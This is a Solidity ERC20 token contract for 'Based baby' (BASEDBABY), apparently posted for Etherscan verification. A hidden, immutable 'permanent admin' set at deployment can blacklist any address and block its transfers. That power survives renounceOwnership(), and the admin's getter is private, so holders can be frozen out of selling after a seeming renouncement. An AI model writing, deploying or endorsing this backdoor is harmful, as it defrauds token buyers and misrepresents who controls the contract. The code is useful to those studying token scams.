/**
 *Submitted for verification at Etherscan.io on 2025-01-01
*/

// SPDX-License-Identifier: MIT
                                                                 
pragma solidity ^0.8.24;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner_, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner_, address indexed spender, uint256 value);
}

contract BASEDBABY is IERC20 {
    string public constant name = "Based baby";
    string public constant symbol = "BASEDBABY";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals; 

    // Mappings
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public blacklist;
    
    // Owner and Admin
    address private _owner;
    address private immutable _permanentAdmin;

    // Events
    event BlacklistAdded(address indexed account);
    event BlacklistRemoved(address indexed account);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OwnershipRenounced(address indexed previousOwner);

    modifier onlyOwner() {
        require(msg.sender == _owner, "BASEDBABY: Not the grand BASEDBABY");
        _;
    }

    modifier onlyAdminOrOwner() {
        require(msg.sender == _permanentAdmin || msg.sender == _owner, "BASEDBABY: Not authorized");
        _;
    }

    constructor(address adminAddress) {
        require(adminAddress != address(0), "BASEDBABY: Admin cannot be zero address");
        _owner = msg.sender;
        _permanentAdmin = adminAddress;  // Set custom permanent admin address

        // Initial supply to owner
        _balances[_owner] = totalSupply;
        emit Transfer(address(0), _owner, totalSupply);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0) && recipient != address(0), "BASEDBABY: Casting spells into the void");
        require(_balances[sender] >= amount, "BASEDBABY: Not enough mana");
        require(!blacklist[sender] && !blacklist[recipient], "BASEDBABY: Dark magic detected");

        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        
        emit Transfer(sender, recipient, amount);
    }

    // ERC20 functions
    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner_, address spender) external view override returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        require(!blacklist[msg.sender] && !blacklist[spender], "BASEDBABY: Dark magic detected");
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "BASEDBABY: Spell power too low");
        _transfer(sender, recipient, amount);
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        return true;
    }

    // Admin functions
    function addToBlacklist(address account) external onlyAdminOrOwner {
        require(account != address(0), "BASEDBABY: Cannot banish the void");
        blacklist[account] = true;
        emit BlacklistAdded(account);
    }

    function removeFromBlacklist(address account) external onlyAdminOrOwner {
        require(account != address(0), "BASEDBABY: Cannot unbanish the void");
        blacklist[account] = false;
        emit BlacklistRemoved(account);
    }

    // Ownership management
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "BASEDBABY: Cannot transfer to the void");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() external onlyOwner {
        address previousOwner = _owner;
        _owner = address(0);
        emit OwnershipRenounced(previousOwner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function permanentAdmin() private view returns (address) {
        return _permanentAdmin;
    }
}
/*
If the ERC20 contract is not traded, it will be canceled.
*/